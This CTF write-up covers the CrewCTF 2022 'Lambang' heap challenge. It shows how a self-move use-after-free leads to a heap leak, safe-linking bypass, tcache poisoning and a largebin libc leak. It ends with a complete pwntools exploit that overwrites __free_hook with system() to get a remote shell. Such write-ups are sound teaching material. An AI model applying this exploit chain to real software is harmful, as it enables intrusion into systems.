# **Lambang**

## Description
> Lambang is a Pro Hacker guy he made this challenge to test you.  
author: Linz#0417  
nc lambang.crewctf-2022.crewc.tf 1337  

```console
┌──(kali㉿kali)-[~/Desktop/pwn/crew/lambang]
└─$ checksec mynote_patched
[*] '/home/kali/Desktop/pwn/crew/lambang/mynote_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
                                                                                            
┌──(kali㉿kali)-[~/Desktop/pwn/crew/lambang]
└─$ ./mynote_patched
1. Alloc
2. Show
3. Move
4. Copy
> 
```  

## Reversing  
We have 4 options: Allocate, Show, Move and Copy. They do exactly what they imply  

```c
void alloc(void)

{
  uint uVar1;
  uint uVar2;
  void *pvVar3;
  
  printf("Index: ");
  uVar1 = getint();
  if (6 < uVar1) {
    error("Invalid index");
  }
  printf("Size: ");
  uVar2 = getint();
  if ((uVar2 == 0) || (0x70 < uVar2)) {
    error("Invalid size");
  }
  pvVar3 = malloc((ulong)uVar2);
  *(void **)(notes + (ulong)uVar1 * 0x10) = pvVar3;
  *(uint *)(notes + (ulong)uVar1 * 0x10 + 8) = uVar2;
  printf("Content: ");
  getnline(*(undefined8 *)(notes + (ulong)uVar1 * 0x10),uVar2);
  return;
}
```  
There are 7 indexes where we can store the address of the chunk we allocated. We can have the maximum size of `0x70` bytes and we are allowed to write into those chunks.  
`getint()` does return a number larger than integer, but I could not manage to find a way to exploit that.  

```c
void show(void)

{
  uint uVar1;
  
  printf("Index: ");
  uVar1 = getint();
  if ((6 < uVar1) || (*(long *)(notes + (ulong)uVar1 * 0x10) == 0)) {
    error("Invalid index");
  }
  puts(*(char **)(notes + (ulong)uVar1 * 0x10));
  return;
} 
```  
`show()` shows the content of the chunk we allocated  
  
`copy()` has 2 functionality both: move and copy  

```c
int copy(EVP_PKEY_CTX *dst,EVP_PKEY_CTX *src)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  void *local_10;
  
  printf("Index (src): ");
  uVar2 = getint();
  if ((6 < uVar2) || (*(long *)(notes + (ulong)uVar2 * 0x10) == 0)) {
    error("Invalid index");
  }
  printf("Index (dest): ");
  uVar3 = getint();
  if (6 < uVar3) {
    error("Invalid index");
  }
  local_10 = (void *)0x0;
  if (*(long *)(notes + (ulong)uVar3 * 0x10) == 0) {
    local_10 = malloc((ulong)*(uint *)(notes + (ulong)uVar2 * 0x10 + 8));
  }
  else if (*(uint *)(notes + (ulong)uVar3 * 0x10 + 8) < *(uint *)(notes + (ulong)uVar2 * 0x10 + 8) )
  {
    error("No enough space");
  }
  else {
    local_10 = *(void **)(notes + (ulong)uVar3 * 0x10);
  }
  memcpy(local_10,*(void **)(notes + (ulong)uVar2 * 0x10),
         (ulong)*(uint *)(notes + (ulong)uVar2 * 0x10 + 8));
  if ((char)dst != '\0') {
    free(*(void **)(notes + (ulong)uVar2 * 0x10));
    *(undefined8 *)(notes + (ulong)uVar2 * 0x10) = 0;
  }
  *(void **)(notes + (ulong)uVar3 * 0x10) = local_10;
  iVar1 = *(int *)(notes + (ulong)uVar2 * 0x10 + 8);
  *(int *)(notes + (ulong)uVar3 * 0x10 + 8) = iVar1;
  return iVar1;
}
```  

The function does check the index, the size, and the address saved in those 7 indexes carefully.  
It works somewhat like this:  
Check address stored at `src` index != null  
--> Check address stored at `des` index, if null malloc a chunk, if not compare the size between `src` and `des` ( make sure that size in `des` is enough to copy from `src` to `des`)  
--> Copy content from `src` to `des`  
--> If it's a `move` then free the chunk at `src` and set the address stored at `src` index to 0 (prevent use-after-free)  
--> Set address at `des` index to itself (or the address provided by malloc() ), set size to `src` size  

## Exploitation  
There was a UAF bug in `copy()`, particularly in the last 2 steps:  
--> If it's a `move` then free the chunk at `src` and set the address stored at `src` index to 0 (prevent use-after-free)  
--> Set address at `des` index to itself (or the address provided by malloc() ), set size to `src` size  
The problems is when we `move` to itself. The chunk is freed, the address is set to 0 but after that, the address at `des` get set. But `src` = `des`, thus we have a UAF.  
With this UAF, we can `show()` what stored in that chunk, and `copy()` to write to that chunk, after it was freed.  

```console
┌──(kali㉿kali)-[~/Desktop/pwn/crew/lambang]
└─$ ./mynote_patched
1. Alloc
2. Show
3. Move
4. Copy
> 1
Index: 0
Size: 10
Content: AAAA
1. Alloc
2. Show
3. Move
4. Copy
> 3
Index (src): 0
Index (dest): 0
1. Alloc
2. Show
3. Move
4. Copy
> 2
Index: 0
�p^X
1. Alloc
2. Show
3. Move
4. Copy
> 
```  
```console  
0x555555558060 <notes>: 0x000055555555a2a0      0x000000000000000a
0x555555558070 <notes+16>:      0x0000000000000000      0x0000000000000000
0x555555558080 <notes+32>:      0x0000000000000000      0x0000000000000000
0x555555558090 <notes+48>:      0x0000000000000000      0x0000000000000000
0x5555555580a0 <notes+64>:      0x0000000000000000      0x0000000000000000
```  
The address is still there after freed  
```console
gef➤  x/10gx 0x000055555555a2a0 - 0x10
0x55555555a290: 0x0000000000000000      0x0000000000000021
0x55555555a2a0: 0x000000055555555a      0x000055555555a010
0x55555555a2b0: 0x0000000000000000      0x0000000000020d51
```  
Now we can try to overwrite this freed chunk, which is a tcache bin. We can try tcache poisoning, overwrite the fd pointer at `0x55555555a2a0`. But because this was glibc 2.32, there is an additional mitigation, which is safe-linking.  
You can read more about it here: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/  
In short, it protects the fd pointer by signing the address with heap address. Because heap address is affected by ASLR, we thus have to leak the heap address before we can overwrite the fd pointer, or else the address we overwrite will be invalid without the signing.  
The formula for masking: P' = P ^ (L >> 12)  
                         P' : the masked address  
                         P  : the original address  
                         L  : the heap address where it's stored at 
Note that: the unmasked address has to satisfy: `P' & 0xf == 0`, so there is an alignment check we have to pass.  
                         
When there is only one chunk in tcache bin, `P = 0`, so the masked address is simply heap address shift right by 12 bit.  
So when we `show()` at address `0x55555555a2a0` it simply prints out the heap address for us `0x000000055555555a`. And we can shift left by 12 bit to get the original heap base address, defeating the aslr, and thus safe-linking.  

### Infoleak  
We have a few constraints: we can only have a maximum of 7 chunk address, thus can only free atmost 7 chunks, and the chunk size is limited to `0x70` bytes. So we can only fill the tcache bins.   
What we want to do to leak libc address is to get either of these three: unsorted bin, smallbin, largebin. There is a libc address in the freed chunk which belongs to those bins.  
First, I tried with unsorted bin.  
There are many approaches, with tcache poisoning you can overwrite the tcache structure, set the counter to 7, so the next `free()` will put our chunk into unsorted bin, if the size is larger then fastbin range( > 0x80 bytes).  
My approach was to free a chunk that has size larger than tcache range( > 0x408 bytes) by overwriting the size of the chunk that save tcache struct, then free it.  
```console
gef➤  heap chunks
Chunk(addr=0x55555555a010, size=0x290, flags=PREV_INUSE)
    [0x000055555555a010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555a2a0, size=0x20, flags=PREV_INUSE)
    [0x000055555555a2a0     41 41 41 41 00 00 00 00 00 00 00 00 00 00 00 00    AAAA............]
Chunk(addr=0x55555555a2c0, size=0x20d50, flags=PREV_INUSE)
    [0x000055555555a2c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55555555a2c0, size=0x20d50, flags=PREV_INUSE)  ←  top chunk
```  
Note that to pass security check, `address + size` has to point to a valid chunk that has the flag `PREV_INUSE` set.  
We can allocate a lot of chunks and, readjust the size overwritten, to pass that check.  
```console
gef➤  heap chunks
Chunk(addr=0x55688c774010, size=0x490, flags=PREV_INUSE)
    [0x000055688c774010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55688c7744a0, size=0x80, flags=PREV_INUSE)
    [0x000055688c7744a0     00 00 00 00 00 00 00 00 10 40 77 8c 68 55 00 00    .........@w.hU..]
```
Here are my heap chunks after some grooming. Now free it.  
```console
gef➤  heap chunks
Chunk(addr=0x55688c774010, size=0x490, flags=PREV_INUSE)
    [0x000055688c774010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55688c7744a0, size=0x80, flags=PREV_INUSE)
    [0x000055688c7744a0     00 00 00 00 00 00 00 00 10 40 77 8c 68 55 00 00    .........@w.hU..]
gef➤  heap bins unsorted
───────────────────────── Unsorted Bin for arena at 0x7efe4e974ba0 ─────────────────────────
[+] unsorted_bins[0]: fw=0x55688c774000, bk=0x55688c774000
 →   Chunk(addr=0x55688c774010, size=0x490, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
```  
But... there is a problem.  
```console
gef➤  x/6gx 0x55688c774010 - 0x10
0x55688c774000: 0x0000000000000000      0x0000000000000491
0x55688c774010: 0x00007efe4e974c00      0x00007efe4e974c00
0x55688c774020: 0x0000000000000000      0x0000000000000000
gef➤  x/gx 0x00007efe4e974c00
0x7efe4e974c00 <main_arena+96>: 0x000055688c774c70
```
There is a null byte in the leaked address. To move forward, we can try either smallbin or largebin. With smallbin we can `malloc()` many times, till one point the chunk in unsorted bin does not have enough size, and get pushed into smallbin.  
I went with largebin, to do that, i need 2 chunks in unsorted bin, `malloc()` once and a chunk will be pushed into largebin.  
```console
gef➤  heap chunks
Chunk(addr=0x55d3c878c010, size=0x490, flags=PREV_INUSE)
    [0x000055d3c878c010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55d3c878c4a0, size=0x80, flags=PREV_INUSE)
    [0x000055d3c878c4a0     00 00 00 00 00 00 00 00 10 c0 78 c8 d3 55 00 00    ..........x..U..]
Chunk(addr=0x55d3c878c520, size=0x480, flags=PREV_INUSE)
    [0x000055d3c878c520     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55d3c878c9a0, size=0x80, flags=PREV_INUSE)
    [0x000055d3c878c9a0     9c 42 44 95 d6 55 00 00 00 00 00 00 00 00 00 00    .BD..U..........]
gef➤  c
gef➤  heap chunks
Chunk(addr=0x55d3c878c010, size=0x490, flags=PREV_INUSE)
    [0x000055d3c878c010     00 6c 9d 32 8d 7f 00 00 10 c5 78 c8 d3 55 00 00    .l.2......x..U..]
Chunk(addr=0x55d3c878c4a0, size=0x80, flags=! PREV_INUSE)
    [0x000055d3c878c4a0     00 00 00 00 00 00 00 00 10 c0 78 c8 d3 55 00 00    ..........x..U..]
Chunk(addr=0x55d3c878c520, size=0x480, flags=PREV_INUSE)
    [0x000055d3c878c520     00 c0 78 c8 d3 55 00 00 00 6c 9d 32 8d 7f 00 00    ..x..U...l.2....]
Chunk(addr=0x55d3c878c9a0, size=0x80, flags=! PREV_INUSE)
    [0x000055d3c878c9a0     9c 42 44 95 d6 55 00 00 00 00 00 00 00 00 00 00    .BD..U..........]
gef➤  heap bins unsorted
───────────────────────── Unsorted Bin for arena at 0x7f8d329d6ba0 ─────────────────────────
[+] unsorted_bins[0]: fw=0x55d3c878c510, bk=0x55d3c878c000
 →   Chunk(addr=0x55d3c878c520, size=0x480, flags=PREV_INUSE)   →   Chunk(addr=0x55d3c878c010, size=0x490, flags=PREV_INUSE)
[+] Found 2 chunks in unsorted bin.
gef➤  c
gef➤  heap bins
───────────────────────── Unsorted Bin for arena at 0x7f8d329d6ba0 ─────────────────────────
[+] unsorted_bins[0]: fw=0x55d3c878c560, bk=0x55d3c878c560
 →   Chunk(addr=0x55d3c878c570, size=0x430, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
────────────────────────── Large Bins for arena at 0x7f8d329d6ba0 ──────────────────────────
[+] large_bins[65]: fw=0x55d3c878c000, bk=0x55d3c878c000
 →   Chunk(addr=0x55d3c878c010, size=0x490, flags=PREV_INUSE)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  x/6gx 0x55d3c878c010 - 0x10
0x55d3c878c000: 0x0000000000000000      0x0000000000000491
0x55d3c878c010: 0x00007f8d329d7010      0x00007f8d329d7010
0x55d3c878c020: 0x000055d3c878c000      0x000055d3c878c000
gef➤  x/gx 0x00007f8d329d7010
0x7f8d329d7010 <main_arena+1136>:       0x00007f8d329d7000
``` 
We now have our libc leaked address.  

### Exploit  
After all that arbitrary write in the info leak step, the final step of overwriting `__free_hook` to point to `system()` and `free()` a chunk that contains `/bin/sh` becomes trivial. Just have to be careful with tcache a bit, because we overwrite into the tcache struct so a few particular size of tcache bins got corruped.  
```console
gef➤  heap bins
───────────────────────────────── Tcachebins for thread 1 ─────────────────────────────────
Tcachebins[idx=6, size=0x80] count=32653  ←  [Corrupted chunk at 0x55d3c878c]
```  
Here is my final exploit:  
```python
from pwn import *

context.log_level = 'debug'
LOCAL = False
REMOTE = True
libc = ELF('libc.so.6')
if REMOTE:
	p = remote('lambang.crewctf-2022.crewc.tf',1337)
if LOCAL:
	#p = process('./chall_one_patched')
	p = gdb.debug("./mynote_patched")
	
def free(idx):
	p.sendlineafter("> ","3")
	p.sendlineafter(": ",str(idx))
	p.sendlineafter(": ",str(idx))
	
def move(src,des):
	p.sendlineafter("> ","3")
	p.sendlineafter(": ",str(src))
	p.sendlineafter(": ",str(des))
	
def alloc(idx,sz,pay=""):
	if pay == "":
		pay = "\x00"*int(sz/2)
	p.sendlineafter("> ","1")
	p.sendlineafter(": ",str(idx))
	p.sendlineafter(": ",str(sz))
	p.sendlineafter(": ",pay)

def copy(src,des):
	p.sendlineafter("> ","4")
	p.sendlineafter(": ",str(src))
	p.sendlineafter(": ",str(des))
	
def show(idx):
	p.sendlineafter("> ","2")
	p.sendlineafter(": ",str(idx))

#---LEAK HEAP BASE ADDRESS 
alloc(0,112)
free(0)
show(0)
L12 = u64(p.recv(5).ljust(8,"\x00"))
base_heap = L12 << 12
L121 = (base_heap + 0x420) >> 12
log.info("Heap Base Address: " + hex(base_heap))

#---USE HEAP BASE TO SIGN THE ADDRESS FOR TCACHE POISONING---
#MALLOC TO GET A POINTER TO ADDRESS ON THE HEAP USE THAT TO HAVE ARBITRARY WRITE
#Overwrite the size to get a large chunks (>0x420 bytes)
#Tcache poisoning to get another address point to that chunk and free it
#It will put that chunk into unsorted bin, and there is an adderss point to main_arena + 96 at the freed chunk section which has a null byte in it :(

#---Overwrite the size of the tcache struct chunk---
to_overwrite = (base_heap) ^ L12
alloc(0,112)
alloc(1,112)
alloc(6,112,p64(to_overwrite))
free(1)
free(0)
copy(6,0)
alloc(1,112)
alloc(0,112,p64(0) + p64(0x491))

#---Tcache poisoning to get a pointer point to that tcache struct chunk---
to_overwrite_2 = (base_heap + 0x10) ^ L121
alloc(2,112)
alloc(3,112)
alloc(4,112,p64(to_overwrite_2))
free(3)
free(2)
copy(4,2)
alloc(3,112)
alloc(2,112) #notes[2] now point to th tcache struct chunk (heap_base + 0x10)

#---Allocate a lot so we have many valid chunks to prepare for our 2 large chunk---
alloc(3,112)
alloc(3,112)
alloc(3,112)
alloc(3,112)
alloc(3,112)
alloc(3,112)
alloc(3,112)
alloc(4,112)

#---The same process as before---
L122 = ((base_heap + 0x8a0) >> 12 )
to_over_write_3 = (base_heap + 0x510) ^ L122
alloc(5,112,p64(to_over_write_3))
free(4)
free(3)
copy(5,3)
to_over_write_4 = (base_heap + 0x520) ^ L122
alloc(4,112)
alloc(3,112)
alloc(6,112,p64(0) + p64(0x481))
alloc(5,112,p64(to_over_write_4))
move(6,3)
free(4)
copy(5,4)
alloc(6,112)
alloc(4,112) # notes[4] now points to our second large chunk that we will free


alloc(5,0x50)
alloc(6,0x50)
alloc(3,0x40)
alloc(1,0x40)

#---Free to get 2 chunks in unsorted bin---
free(2)
free(4)

#---Malloc to trigger the push into largebin---
alloc(6,70)

free(3)
free(1)
free(5)
free(6)

#---Leaked libc address---
show(2)
main_arena = u64(p.recv(6).ljust(8,"\x00"))
libc_base = main_arena - 1136 - 0x1e3ba0
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
log.info("Libc Base Address: " + hex(libc_base))
log.info("__free_hook Address: " + hex(free_hook))

#---Tcache poisoning again to get notes[5] to point to __free_hook and overwrite it with address of system()---
to_over_write_5 = (free_hook) ^ L122
alloc(6,0x40,p64(to_over_write_5))
copy(6,1)

alloc(1,0x40,"/bin/sh #")
alloc(5,0x40,p64(system))
free(1)

p.interactive()
```  











